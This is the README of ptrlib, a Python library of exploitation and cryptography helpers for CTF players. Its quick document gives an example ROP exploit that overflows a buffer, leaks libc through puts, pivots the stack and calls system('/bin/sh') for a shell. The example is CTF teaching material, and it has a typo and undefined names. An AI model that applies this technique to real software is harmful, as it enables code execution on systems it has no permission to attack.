ptrlib
====

![Python application](https://github.com/ptr-yudai/ptrlib/workflows/Python%20application/badge.svg)

Python library which bundles security-related utilities.

## Description
Ptrlib is a Python library for CTF players.
It's designed to make it easy to write a complex program of cryptography, networking, exploit and so on.

## Why not pwntools?
Ptrlib is designed to be as library-independent as possible.
Also, ptrlib has some pros such as supporting Windows process.

## Requirements
Supports: Python 3.5 or later

Library Dependency:
- pycryptodome
- pywin32 (when handling Windows process)

External Program:
- When using `SSH` function:
  - ssh
  - expect
- When using `nasm` function:
  - nasm

## Usage
Basic examples are available at [/examples](https://github.com/ptr-yudai/ptrlib/tree/master/examples/).

Testcases under [/tests](https://github.com/ptr-yudai/ptrlib/tree/master/tests/) may also help you understand ptrlib.

## Quick Document
There are many functions in ptrlib.
In this section we try using it for a pwnable task.

You can run executable or create socket like this:
```python
sock = Process("./pwn01")
sock = Process(["./pwn01", "--debug"])
sock = Socket("localhost", 1234)
sock = SSH("example.com", 22, username="ubuntu", password="p4s$w0rd")
sock = SSH("example.com", 22, username="ubuntu", identity="./id_rsa")
```

If you have the target binary or libc, it's recommended to load them first.
```python
elf = ELF("./pwn01")
libc = ELF("./libc.so.6")
```
This doesn't fully analyse the binary so that it runs fast.
Also, ELF class supports cache to reduce calculation.

You can use some useful methods such as `got`, `plt`, `symbol`, `section` and so on.
The following is an example to craft ROP stager.
```python
# ROP chain
addr_stage2 = elf.section(".bss") + 0x400

payload = b'A' * 0x108
payload += flat([
  # puts(puts@got)
  next(elf.gadgets("pop rdi; ret;")),
  elf.got("puts"),
  elf.plt("puts"),
  # gets(stage2)
  next(elf.gadgets("pop rdi; ret;")),
  addr_stage2,
  elf.plt("gets"),
  # stack pivot
  next(elf.gadgets("pop rbp; ret;")),
  addr_stage2,
  rop_leave_ret
], map=p64)
sock.sendlineafter("Data: ", payload)

# Leak libc address
libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))
libc.base = libc_base

payload  = b'A' * 8
paylaod += p64(rop_pop_rdi)
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbol("system"))
sock.sendline(payload)

sock.interactive()
```

## Install
Run `pip install ptrlib` or `python setup.py install`.

## Licence

[MIT](https://github.com/tcnksm/tool/blob/master/LICENCE)

## Author

[ptr-yudai](https://github.com/ptr-yudai)

## Contributor
Feel free to make a pull request / issue :)

- [theoremoon](https://github.com/theoremoon)
  - Added/fixed several cryptography functions
  - Added buffering of Socket/Process
  - Added status check (CI test)
- [keymoon](https://github.com/key-moon)
  - Added algorithm package
